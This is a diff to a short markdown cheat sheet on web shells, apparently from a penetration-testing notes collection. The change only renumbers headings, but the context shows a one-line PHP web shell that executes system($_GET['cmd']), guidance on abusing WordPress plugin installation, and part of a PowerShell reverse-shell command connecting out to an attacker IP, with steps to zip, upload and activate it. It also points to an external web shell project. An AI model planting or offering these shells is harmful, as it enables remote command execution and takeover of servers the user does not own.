@@ -1,6 +1,8 @@
 title: Web Shells
 
-# Basic PHP
+# Web Shells
+
+## Basic PHP
 
 Simple PHP webshell, add `?cmd={command}` to the URL.
 
@@ -11,7 +13,7 @@ system($_GET['cmd']);
 ?>
 ```
 
-# Wordpress
+## Wordpress
 
 You can abuse the wordpress plugin feature to get a reverse shell if you have access to install plugins.
 
@@ -40,7 +42,7 @@ exec("powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10
 ```
 Save the above to a file, compress into a `.zip` archive and then upload & activate.
 
-# Simple-PHP-Web-Shell
+## Simple-PHP-Web-Shell
 
 [Simple-PHP-Web-Shell](https://github.com/artyuum/Simple-PHP-Web-Shell) by [Artyumm](https://github.com/artyuum) is nice webshell that includes a command box and nicely formatted output
 
